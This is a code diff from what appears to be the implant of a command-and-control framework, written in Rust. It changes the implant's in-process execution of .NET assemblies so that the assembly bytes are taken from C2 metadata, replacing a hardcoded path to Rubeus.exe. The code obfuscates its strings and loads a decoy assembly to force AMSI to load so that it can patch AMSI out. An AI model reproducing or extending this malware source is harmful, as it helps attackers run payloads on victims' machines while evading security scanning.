@@ -1,6 +1,6 @@
 use std::{ffi::c_void, ptr::null_mut};
 
-use shared::tasks::WyrmResult;
+use shared::{task_types::DotExDataForImplant, tasks::WyrmResult};
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
     Win32::System::{
@@ -73,13 +73,20 @@ pub fn execute_dotnet_current_process(metadata: &Option<String>) -> WyrmResult<S
         return WyrmResult::Err(sc!("No metadata received with command.", 87).unwrap());
     }
 
-    match execute_dotnet_assembly() {
-        Ok(_) => WyrmResult::Ok(String::from("Assembly running..")),
-        Err(_) => WyrmResult::Err(String::from("Error received during execution")),
+    let deser = match serde_json::from_str::<DotExDataForImplant>(metadata.as_ref().unwrap()) {
+        Ok(d) => d,
+        Err(e) => {
+            return WyrmResult::Err(sc!("Could not deserialise metadata", 76).unwrap());
+        }
+    };
+
+    match execute_dotnet_assembly(&deser.0) {
+        Ok(_) => WyrmResult::Ok(sc!("Assembly running..", 49).unwrap()),
+        Err(_) => WyrmResult::Err(sc!("Error received during execution", 56).unwrap()),
     }
 }
 
-fn execute_dotnet_assembly() -> Result<(), DotnetError> {
+fn execute_dotnet_assembly(buf: &[u8]) -> Result<(), DotnetError> {
     //
     // Load the CLR into the process and setup environment to support
     //
@@ -89,10 +96,7 @@ fn execute_dotnet_assembly() -> Result<(), DotnetError> {
     start_runtime(host)?;
     let app_domain = get_default_appdomain(host)?;
 
-    // Read file
-    // TODO this will be bytes sent from the C2
-    let f = std::fs::read(r"C:\tmp\Rubeus.exe").expect("could not read file");
-    let p_sa = create_safe_array(&f)?;
+    let p_sa = create_safe_array(buf)?;
 
     // Create a junk decoy safe array such that we force a load of AMSI to then patch out
     let decoy_buf = [0x00, 0x00, 0x00, 0x01];
@@ -107,7 +111,7 @@ fn execute_dotnet_assembly() -> Result<(), DotnetError> {
     let load_3 = unsafe { (*(*app_domain).vtable).Load_3 };
 
     // Decoy
-    let res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
+    let _res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
 
     patch_amsi_if_ft_flag();
 
